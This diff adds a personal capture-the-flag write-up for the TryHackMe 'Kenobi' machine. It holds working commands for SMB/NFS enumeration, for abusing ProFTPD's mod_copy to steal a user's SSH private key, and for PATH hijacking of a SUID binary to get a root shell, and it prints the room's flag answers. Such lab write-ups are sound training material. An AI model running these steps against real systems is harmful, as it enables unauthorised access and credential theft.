@@ -1,0 +1,190 @@
+#kenobi
+>Siam AHmed | 23.11.2021
+---------------------------------------------------
+
+#target ip[10.10.229.127]
+
+#Task 1: deploy and scan.How many ports are open?
+#start scan with nmap-->
+7ports are open
+
+#Task 2: Enumerating Samba for shares 
+scanning the smb using nmap
+
+```
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.229.127
+```
+scanning rpb
+```
+ When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 
+```
+
+let's enum it with nmap and store the result into different file
+```
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.229.127
+```
+
+it shows the following results
+```
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-showmount: 
+|_  /var *
+
+```
+after scanning let's connect to their machine network
+```
+──(kali㉿kali)-[~/death-Note/ctf/try-hack-me/kenobi]
+└─$ smbclient //10.10.229.127/anonymous                                      127 ⨯
+Enter WORKGROUP\kali's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Sep  4 06:49:09 2019
+  ..                                  D        0  Wed Sep  4 06:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
+
+		9204224 blocks of size 1024. 6877104 blocks available
+smb: \> 
+```
+
+download files using 
+```
+smbget -R smb://10.10.229.127/anonymous
+```
+# Port 21 is the standard FTP port.
+Port				21
+
+searching with enum4linux for more information
+```
+enum4linux -a 10.10.229.127| tee enum4linux.log
+```
+
+#Task 3: Gain initial access with ProFtpd 
+
+looking at the version by using the netcat 
+```
+nc 10.10.229.127 21
+```
+search for the exploit in the searchsploit
+
+```
+searchsploit proftpd 1.3.5
+```
+
+You should have found an exploit from ProFtpd's mod_copy module. 
+
+The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
+
+We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 
+
+We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.
+
+```
+nc 10.10.229.127 21
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+
+```
+We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
+
+Lets mount the /var/tmp directory to our machine
+```
+mkdir /mnt/kenobiNFS
+mount machine_ip:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+```
+We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
+
+```
+cp /mnt/kenobiNFS/tmp/id_rsa .
+sudo chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.10.229.127
+```
+
+***user flag= "d0b0f3f53b6caa532a83915e19224899"***
+#Task 4: Privilege Escalation with Path Variable Manipulation  
+
+
+SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.
+
+To search the a system for these type of files I ran the following: 
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+found something really interesting in the search. there is a ```/usr/bin/menu``` binary in the system which is particularly out of ordinary, And guess what it gives me the some more information.
+```
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :2
+4.8.0-58-generic
+```
+kinda same information but a little more
+```
+kenobi@kenobi:~$ curl -I localhost
+
+HTTP/1.1 200 OK
+Date: Wed, 24 Nov 2021 04:02:08 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
+ETag: "c8-591b6884b6ed2"
+Accept-Ranges: bytes
+Content-Length: 200
+Vary: Accept-Encoding
+Content-Type: text/html
+
+kenobi@kenobi:~$ uname -r
+4.8.0-58-generic
+kenobi@kenobi:~$ ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:eb:e7:79:c3:71  
+          inet addr:10.10.229.127  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::eb:e7ff:fe79:c371/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:443 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:465 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:36565 (36.5 KB)  TX bytes:52652 (52.6 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:202 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:202 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:15317 (15.3 KB)  TX bytes:15317 (15.3 KB)
+
+
+```
+
+this shows the binary is running without the full path. As this file runs as the root users privileges we can manipulate our path gain a root shell
+
+
+
+Strings is a command on Linux that looks for human readable strings on a binary.
+```
+curl -I localhost
+uname -r
+ifconfig
+```
+
+This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
+
+As this file runs as the root users privileges, we can manipulate our path gain a root shell.
+
+```
+cd /tmp
+echo /bin/sh >curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+```
+we got the shell. let's move to root and find the flag
+
+```
+WHAT IS THE ROOT FLAG?
+177b3cd8562289f37382721c28381f02
+```
